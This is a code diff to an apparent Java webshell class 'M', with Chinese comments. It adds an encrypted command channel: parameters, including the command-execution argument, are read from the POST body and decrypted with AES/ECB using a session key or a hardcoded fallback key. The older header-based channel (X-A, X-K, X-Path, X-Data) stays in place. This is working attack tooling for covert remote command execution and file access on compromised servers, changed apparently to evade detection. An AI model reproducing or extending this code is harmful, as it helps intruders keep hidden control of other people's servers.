@@ -18,6 +18,7 @@ public class M {
     private Object request;
     private Object response;
     private Object session;
+    private java.util.Map<String, String> params;
 
     @Override
     public boolean equals(Object obj) {
@@ -27,6 +28,9 @@ public class M {
 
             Object req = this.request;
             Object res = this.response;
+
+            // 读取 body 第二行作为参数（加密的 URL-encoded key=value）
+            this.params = readParamsFromBody(req);
 
             try {
                 res.getClass().getMethod("setCharacterEncoding", String.class).invoke(res, "UTF-8");
@@ -137,18 +141,53 @@ public class M {
         } catch (Exception ignored) {}
     }
 
-    private static String getParam(Object req, String name) {
+    /** 从 POST body 第二行读取加密参数（AES/ECB → base64 → URL-encoded key=value）。 */
+    private java.util.Map<String, String> readParamsFromBody(Object req) {
+        java.util.Map<String, String> map = new java.util.HashMap<>();
+        try {
+            Object reader = req.getClass().getMethod("getReader").invoke(req);
+            String line2 = (String) reader.getClass().getMethod("readLine").invoke(reader);
+            if (line2 != null && !line2.isEmpty()) {
+                byte[] decrypted = decryptParamB64(line2);
+                String qs = new String(decrypted, "UTF-8");
+                for (String pair : qs.split("&")) {
+                    int eq = pair.indexOf('=');
+                    if (eq > 0) {
+                        String k = URLDecoder.decode(pair.substring(0, eq).trim(), "UTF-8");
+                        String v = URLDecoder.decode(pair.substring(eq + 1), "UTF-8");
+                        map.put(k, v);
+                    }
+                }
+            }
+        } catch (Exception ignored) {}
+        return map;
+    }
+
+    /** AES/ECB 解密 base64 密文，返回原始字节。 */
+    private byte[] decryptParamB64(String b64) throws Exception {
+        String key = (String) sessionGet("u");
+        if (key == null) key = "42b842fc69195c9d";
+        byte[] raw = key.getBytes("UTF-8");
+        SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
+        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
+        cipher.init(Cipher.DECRYPT_MODE, skeySpec);
+        return cipher.doFinal(staticB64Decode(b64));
+    }
+
+    private String getParam(Object req, String name) {
+        // 优先从 body 参数读取
+        if (this.params != null && this.params.containsKey(name)) {
+            return this.params.get(name);
+        }
+        // 兼容旧版 Header 传参
         if ("a".equals(name)) { String v = hdr(req, "X-A"); if (v != null) return v; }
         if ("_k".equals(name)) { String v = hdr(req, "X-K"); if (v != null) return v; }
         if ("path".equals(name)) {
-            /* 非 ASCII 路径：客户端用 UTF-8 再 Base64 放入 X-Path-B64（头值仍为 ASCII） */
             String pb = hdr(req, "X-Path-B64");
             if (pb != null && pb.length() > 0) {
                 byte[] raw = staticB64Decode(pb);
                 if (raw != null && raw.length > 0) {
-                    try {
-                        return new String(raw, "UTF-8");
-                    } catch (Exception ignored) {}
+                    try { return new String(raw, "UTF-8"); } catch (Exception ignored) {}
                 }
             }
             String v = hdr(req, "X-Path");
@@ -157,8 +196,16 @@ public class M {
         if ("data".equals(name)) { String v = hdr(req, "X-Data"); if (v != null) return v; }
         if ("blk".equals(name)) { String v = hdr(req, "X-Blk"); if (v != null) return v; }
         if ("bsz".equals(name)) { String v = hdr(req, "X-Bsz"); if (v != null) return v; }
-        String k = hdr(req, "X-K");
-        if (k != null && k.equals(name)) { String v = hdr(req, "X-V"); if (v != null) return v; }
+        if (this.params != null) {
+            String k = this.params.get("_k");
+            if (k != null && k.equals(name)) {
+                // exec 命令参数名是 _k 的值，直接从 body params 取
+                String v = this.params.get(k);
+                if (v != null) return v;
+            }
+        }
+        String hdrK = hdr(req, "X-K");
+        if (hdrK != null && hdrK.equals(name)) { String v = hdr(req, "X-V"); if (v != null) return v; }
 
         try {
             String qs = (String) req.getClass().getMethod("getQueryString").invoke(req);
